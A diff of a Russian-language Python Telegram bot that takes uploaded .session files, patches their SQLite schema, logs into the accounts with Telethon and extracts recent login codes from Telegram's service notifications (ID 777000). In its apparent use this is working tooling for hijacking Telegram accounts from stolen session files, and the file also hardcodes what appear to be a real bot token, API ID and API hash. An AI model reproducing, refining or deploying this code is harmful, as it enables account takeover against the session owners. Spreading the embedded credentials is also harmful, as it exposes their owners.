@@ -1,5 +1,4 @@
 import asyncio
-import os
 import re
 import sqlite3
 from pathlib import Path
@@ -17,8 +16,8 @@ from telethon.errors import SessionPasswordNeededError
 
 # ================== НАСТРОЙКИ ==================
 BOT_TOKEN = "8468979285:AAGz8Zq3N1F01XjFWxTfDfWuOPHGRTAjEjY"
-API_ID = 34910343          # с my.telegram.org
-API_HASH = "d20860d195501ba0993b794f952b1ef1" # с my.telegram.org
+API_ID = 34910343
+API_HASH = "d20860d195501ba0993b794f952b1ef1"
 
 SESSIONS_DIR = Path("sessions")
 SESSIONS_DIR.mkdir(exist_ok=True)
@@ -26,11 +25,9 @@ SESSIONS_DIR.mkdir(exist_ok=True)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# ================== СОСТОЯНИЯ ==================
 class SessionStates(StatesGroup):
     waiting_session = State()
 
-# ================== КЛАВИАТУРА ==================
 def get_code_keyboard():
     builder = InlineKeyboardBuilder()
     builder.button(text="📩 Получить код", callback_data="get_code")
@@ -38,32 +35,55 @@ def get_code_keyboard():
     builder.adjust(1)
     return builder.as_markup()
 
-# ================== ФИКС СЕССИИ ==================
 def fix_session(session_path: str):
-    """Добавляет колонку version, если её нет (исправляет ошибку no such column: version)"""
+    """Жёстко чинит сессию под текущий Telethon"""
     try:
         conn = sqlite3.connect(session_path)
         cursor = conn.cursor()
 
+        # Создаём таблицу version, если её нет
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS version (
+                version INTEGER PRIMARY KEY
+            )
+        """)
+
+        # Проверяем/обновляем версию
+        cursor.execute("SELECT version FROM version")
+        row = cursor.fetchone()
+
+        if not row:
+            cursor.execute("INSERT INTO version VALUES (7)")
+        else:
+            cursor.execute("UPDATE version SET version = 7")
+
+        # Добавляем недостающие колонки
         cursor.execute("PRAGMA table_info(sessions)")
         columns = [col[1] for col in cursor.fetchall()]
 
-        if "version" not in columns:
-            cursor.execute("ALTER TABLE sessions ADD COLUMN version INTEGER DEFAULT 1")
-            conn.commit()
-            print(f"[+] Колонка version добавлена в {session_path}")
+        if "takeout_id" not in columns:
+            try:
+                cursor.execute("ALTER TABLE sessions ADD COLUMN takeout_id INTEGER")
+            except:
+                pass
 
+        if "tmp_auth_key" not in columns:
+            try:
+                cursor.execute("ALTER TABLE sessions ADD COLUMN tmp_auth_key BLOB")
+            except:
+                pass
+
+        conn.commit()
         conn.close()
+        print(f"[+] Сессия починена: {session_path}")
     except Exception as e:
-        print(f"[!] Не удалось починить сессию: {e}")
+        print(f"[!] Ошибка при починке сессии: {e}")
 
-# ================== ОБРАБОТЧИКИ ==================
 @dp.message(CommandStart())
 async def start(message: Message, state: FSMContext):
     await state.clear()
     await message.answer(
-        "Привет!\n"
-        "Отправь мне файл <b>.session</b>, и я смогу доставать из него коды входа.",
+        "Привет!\nОтправь мне файл <b>.session</b>",
         parse_mode="HTML"
     )
     await state.set_state(SessionStates.waiting_session)
@@ -73,16 +93,13 @@ async def receive_session(message: Message, state: FSMContext):
     document = message.document
 
     if not document.file_name.endswith(".session"):
-        await message.answer("Пришли именно файл с расширением <b>.session</b>", parse_mode="HTML")
+        await message.answer("Нужен именно файл <b>.session</b>", parse_mode="HTML")
         return
 
     user_id = message.from_user.id
     session_path = SESSIONS_DIR / f"{user_id}.session"
 
-    # Скачиваем файл
     await bot.download(document, destination=session_path)
-
-    # Чиним сессию сразу после загрузки
     fix_session(str(session_path))
 
     await state.update_data(session_path=str(session_path))
@@ -101,28 +118,26 @@ async def get_code_handler(callback: CallbackQuery, state: FSMContext):
     session_path = data.get("session_path")
 
     if not session_path or not Path(session_path).exists():
-        await callback.answer("Сессия не найдена. Пришли .session заново.", show_alert=True)
+        await callback.answer("Сессия не найдена", show_alert=True)
         return
 
     await callback.answer("Ищу код...")
 
     try:
-        # Ещё раз чиним на всякий случай
         fix_session(session_path)
 
         client = TelegramClient(session_path, API_ID, API_HASH)
         await client.connect()
 
         if not await client.is_user_authorized():
-            await callback.message.answer("❌ Сессия не авторизована / протухла")
+            await callback.message.answer("❌ Сессия не авторизована")
             await client.disconnect()
             return
 
-        # Ищем сообщения от официального Telegram (777000)
         code = None
-        async for message in client.iter_messages(777000, limit=20):
-            if message.message:
-                match = re.search(r'\b(\d{5,6})\b', message.message)
+        async for msg in client.iter_messages(777000, limit=25):
+            if msg.message:
+                match = re.search(r'\b(\d{5,6})\b', msg.message)
                 if match:
                     code = match.group(1)
                     break
@@ -131,22 +146,19 @@ async def get_code_handler(callback: CallbackQuery, state: FSMContext):
 
         if code:
             await callback.message.answer(
-                f"🔑 <b>Код найден:</b>\n\n"
-                f"<code>{code}</code>",
+                f"🔑 <b>Код:</b>\n<code>{code}</code>",
                 parse_mode="HTML",
                 reply_markup=get_code_keyboard()
             )
         else:
             await callback.message.answer(
-                "Код не найден в последних сообщениях от Telegram.\n"
-                "Попробуй запросить код ещё раз в клиенте и нажми кнопку снова.",
+                "Код не найден. Запроси код в клиенте и нажми кнопку снова.",
                 reply_markup=get_code_keyboard()
             )
 
     except SessionPasswordNeededError:
         await callback.message.answer(
-            "⚠️ На аккаунте включена 2FA (облачный пароль).\n"
-            "Этот бот умеет доставать только обычный код из уведомлений.",
+            "На аккаунте стоит 2FA. Нужен облачный пароль.",
             reply_markup=get_code_keyboard()
         )
     except Exception as e:
@@ -165,13 +177,12 @@ async def delete_session_handler(callback: CallbackQuery, state: FSMContext):
         Path(session_path).unlink(missing_ok=True)
 
     await state.clear()
-    await callback.message.edit_text("Сессия удалена. Пришли новый .session файл.")
+    await callback.message.edit_text("Сессия удалена. Пришли новый .session")
     await state.set_state(SessionStates.waiting_session)
     await callback.answer()
 
-# ================== ЗАПУСК ==================
 async def main():
-    print("Бот запущен...")
+    print("Бот запущен")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
